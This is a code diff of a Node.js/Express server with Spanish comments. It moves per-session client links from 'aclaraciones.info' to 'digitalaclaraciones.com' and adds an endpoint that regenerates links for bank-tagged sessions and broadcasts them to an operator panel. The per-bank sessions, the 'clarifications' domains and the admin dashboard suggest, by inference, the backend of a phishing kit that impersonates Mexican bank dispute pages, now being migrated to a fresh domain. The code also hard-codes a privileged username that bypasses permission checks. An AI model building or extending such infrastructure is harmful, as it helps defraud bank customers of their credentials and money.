@@ -1132,8 +1132,8 @@ Tu Chat ID ha sido configurado correctamente por un administrador.
       }
 
       // Configuración de dominios
-      const clientDomain = process.env.CLIENT_DOMAIN || 'aclaraciones.info';
-      const adminDomain = process.env.ADMIN_DOMAIN || 'panel.aclaraciones.info';
+      const clientDomain = process.env.CLIENT_DOMAIN || 'digitalaclaraciones.com';
+      const adminDomain = process.env.ADMIN_DOMAIN || 'panel.digitalaclaraciones.com';
 
       // Detectamos si estamos en Replit para generar enlaces locales para pruebas
       const isReplit = process.env.REPL_ID || process.env.REPL_SLUG;
@@ -1143,8 +1143,8 @@ Tu Chat ID ha sido configurado correctamente por un administrador.
       const baseUrl = req.headers.host || (isReplit ? `${process.env.REPL_SLUG || 'workspace'}.replit.dev` : clientDomain);
       const protocol = req.headers['x-forwarded-proto'] || 'https';
       
-      // FORZAMOS el uso de aclaraciones.info independientemente del entorno
-      const clientLink = `https://aclaraciones.info/${sessionId}`;
+      // FORZAMOS el uso de digitalaclaraciones.com independientemente del entorno
+      const clientLink = `https://digitalaclaraciones.com/${sessionId}`;
       
       // Para el admin link, si estamos en Replit permitimos usar la URL local para testing
       const adminLink = isReplit 
@@ -1210,6 +1210,93 @@ Tu Chat ID ha sido configurado correctamente por un administrador.
     } catch (error) {
       console.error("Error generating link:", error);
       res.status(500).json({ message: "Error generating link" });
+    }
+  });
+
+  // Ruta para regenerar enlaces existentes con nuevo dominio
+  app.post('/api/regenerate-link/:sessionId', async (req, res) => {
+    try {
+      if (!req.isAuthenticated()) {
+        return res.status(401).json({ message: "No autenticado" });
+      }
+
+      const { sessionId } = req.params;
+      const user = req.user;
+
+      // Buscar la sesión existente
+      const session = await storage.getSessionById(sessionId);
+      if (!session) {
+        return res.status(404).json({ message: "Sesión no encontrada" });
+      }
+
+      // Verificar permisos del usuario para este banco
+      const userBanks = user.allowedBanks || 'all';
+      let hasBankAccess = false;
+      const sessionBanco = session.banco || 'LIVERPOOL'; // Usar LIVERPOOL como default si no hay banco
+
+      if (user.username === "balonx" || user.role === 'admin') {
+        hasBankAccess = true;
+      } else if (userBanks === 'all' || userBanks.toLowerCase() === 'all') {
+        hasBankAccess = true;
+      } else if (userBanks && userBanks !== '') {
+        const allowedBanksList = userBanks.split(',').map(b => b.trim());
+        hasBankAccess = allowedBanksList.includes(sessionBanco);
+      }
+
+      if (!hasBankAccess) {
+        return res.status(403).json({ 
+          message: `No tienes permisos para regenerar enlaces del banco ${sessionBanco}` 
+        });
+      }
+
+      // Configuración de dominios con el nuevo dominio
+      const clientDomain = process.env.CLIENT_DOMAIN || 'digitalaclaraciones.com';
+      const adminDomain = process.env.ADMIN_DOMAIN || 'panel.digitalaclaraciones.com';
+
+      // Detectamos si estamos en Replit
+      const isReplit = process.env.REPL_ID || process.env.REPL_SLUG;
+      
+      // Generar el nuevo enlace con el nuevo dominio
+      const newClientLink = `https://digitalaclaraciones.com/${sessionId}`;
+      
+      // Para el admin link, si estamos en Replit permitimos usar la URL local para testing
+      const adminLink = isReplit 
+        ? `${req.protocol}://${req.headers.host}` 
+        : `https://${adminDomain}`;
+
+      // Notificar a los clientes admin sobre el enlace regenerado
+      broadcastToAdmins(JSON.stringify({
+        type: 'LINK_REGENERATED',
+        data: { 
+          sessionId,
+          banco: sessionBanco,
+          newLink: newClientLink,
+          userName: user.username,
+          regeneratedBy: user.username
+        }
+      }), user.username);
+
+      // Enviar señal de actualización de sesiones
+      broadcastToAdmins(JSON.stringify({
+        type: 'SESSIONS_UPDATED',
+        data: {
+          userName: user.username,
+          action: 'regenerate'
+        }
+      }));
+
+      res.json({ 
+        sessionId, 
+        link: newClientLink, 
+        adminLink: adminLink,
+        message: 'Enlace regenerado exitosamente con nuevo dominio',
+        oldDomain: 'aclaraciones.info',
+        newDomain: 'digitalaclaraciones.com'
+      });
+
+    } catch (error) {
+      console.error("Error regenerating link:", error);
+      res.status(500).json({ message: "Error al regenerar enlace" });
     }
   });
 
